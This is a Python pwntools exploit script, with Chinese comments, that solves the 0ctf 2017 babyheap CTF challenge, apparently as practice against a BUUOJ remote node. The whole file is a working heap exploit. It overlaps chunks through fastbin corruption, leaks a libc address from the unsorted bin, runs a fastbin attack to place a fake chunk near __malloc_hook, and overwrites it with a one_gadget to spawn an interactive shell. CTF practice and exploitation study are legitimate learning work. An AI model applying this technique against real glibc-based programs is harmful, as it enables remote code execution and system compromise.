from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search_fun, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './0ctf_2017_babyheap'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',25178) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(size):
    sla(b': ',b'1')
    sla(b'Size: ',int2bytes(size))



def show(index):
    sla(b': ',b'4')
    sla(b'Index: ',int2bytes(index))
    ru(b'Content: \n')

def edit(index,content):
    sla(b':',b'2')
    sla(b': ',int2bytes(index))
    sla(b'Size: ',int2bytes(len(content)))
    sla(b'Content: ',content)

def delete(index):
    sla(b':',b'3')
    sla(b': ',int2bytes(index))

# struct{
# 	int a = 1;
# 	int size;
# 	char* heap_ptr;
# }

one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so')


#本题的关键在于如何泄露libc地址
#首先想要泄露libc肯定是要用用show函数
#用show函数就是要堆块中含libc地址-->
#当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址
#即要实现同时要有个块既在unsorted bin中又可以正常访问
add(0x10) #0
add(0x10) #1
add(0x10) #2
add(0x10) #3
add(0x80) #4 small chunk

delete(1)
delete(2)
payload = p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21) + p8(0x80)
edit(0, payload)

payload = p64(0) * 3 + p64(0x21)
edit(3, payload)

add(0x10)#1
add(0x10)#2 -->指向4 small chunk

payload = p64(0) * 3 + p64(0x91)
edit(3, payload)

add(0x10)#5 防止合并
delete(4)

show(2)
data = uu64(r(6))
base = data-88-libc.sym['__malloc_hook']-0x10  # == data-0x3c4b78
leak('base',base)
malloc_hook = base+libc.sym['__malloc_hook']

add(0x60)#4->6  为了配合malloc-0x23的大小
delete(4)

edit(2,p64(malloc_hook-0x23))
add(0x60)#4->6
add(0x60)#7  就是malloc_hook上的fake chunk

one_gadget = base + 0x4526a
#使用rsp+30的one_gadget，本地libc地址为0x4527a，远程lic地址为0x4526a
edit(6,b'a'*(0x23-0x10)+p64(one_gadget))
add(0x10)#触发malloc_hook-->onegadget
itr()